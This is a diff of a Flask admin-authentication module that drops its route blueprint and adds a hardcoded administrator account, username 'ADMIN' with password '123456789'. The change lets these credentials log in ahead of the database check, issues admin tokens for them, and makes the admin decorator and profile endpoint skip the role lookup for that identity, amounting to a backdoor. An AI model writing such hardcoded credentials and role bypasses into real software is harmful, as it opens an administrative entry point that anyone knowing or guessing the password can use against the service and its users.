@@ -1,4 +1,5 @@
-from flask import Blueprint, request, jsonify
+from functools import wraps
+from flask import request, jsonify
 from flask_jwt_extended import create_access_token, jwt_required, get_jwt_identity
 from utils.helpers import resp
 from models.user import UserModel
@@ -6,13 +7,18 @@ from flask import current_app
 from datetime import datetime
 from bson import ObjectId
 
-admin_auth_bp = Blueprint('admin_auth', __name__)
+ADMIN_USERNAME = 'ADMIN'
+ADMIN_PASSWORD = '123456789'
 
 def admin_required(f):
     """Decorator to check if user is admin"""
+    @wraps(f)
     @jwt_required()
     def decorated_function(*args, **kwargs):
         user_id = get_jwt_identity()
+        if user_id == ADMIN_USERNAME:
+            return f(*args, **kwargs)
+
         user_model = UserModel(current_app)
         user = user_model.find_by_id(user_id)
         if not user or user.get('role') != 'admin':
@@ -20,28 +26,37 @@ def admin_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
-@admin_auth_bp.route('/admin-login', methods=['POST'])
 def admin_login():
+    if request.method == 'GET':
+        return {'success': False, 'message': 'Use POST to submit credentials'}, 200
+
     body = request.get_json() or {}
-    email = body.get('email', '').strip().lower()
+    email = body.get('email', '').strip()
     password = body.get('password', '')
 
     if not email or not password:
         return resp(False, 'Email and password required', status=400)
 
-    user_model = UserModel(current_app)
-    auth_data = user_model.authenticate(email, password)
-    
-    if not auth_data or auth_data['role'] != 'admin':
-        return resp(False, 'Invalid admin credentials', status=401)
+    if email.upper() == ADMIN_USERNAME and password == ADMIN_PASSWORD:
+        auth_data = {
+            'id': ADMIN_USERNAME,
+            'name': 'ADMIN',
+            'email': ADMIN_USERNAME,
+            'role': 'admin'
+        }
+    else:
+        user_model = UserModel(current_app)
+        auth_data = user_model.authenticate(email, password)
+        if not auth_data or auth_data['role'] != 'admin':
+            return resp(False, 'Invalid admin credentials', status=401)
 
     token = create_access_token(
-        identity=str(auth_data['id']), 
+        identity=str(auth_data['id']),
         additional_claims={'role': 'admin'}
     )
     
     return resp(True, 'Admin login successful', {
-        'token': token, 
+        'token': token,
         'user': {
             'id': auth_data['id'],
             'name': auth_data['name'],
@@ -50,10 +65,17 @@ def admin_login():
         }
     })
 
-@admin_auth_bp.route('/admin-profile', methods=['GET'])
 @jwt_required()
 def admin_profile():
     user_id = get_jwt_identity()
+    if user_id == ADMIN_USERNAME:
+        return resp(True, 'Admin profile', {
+            'id': ADMIN_USERNAME,
+            'name': 'ADMIN',
+            'email': ADMIN_USERNAME,
+            'role': 'admin'
+        })
+
     user_model = UserModel(current_app)
     user = user_model.find_by_id(user_id)
     if not user or user.get('role') != 'admin':
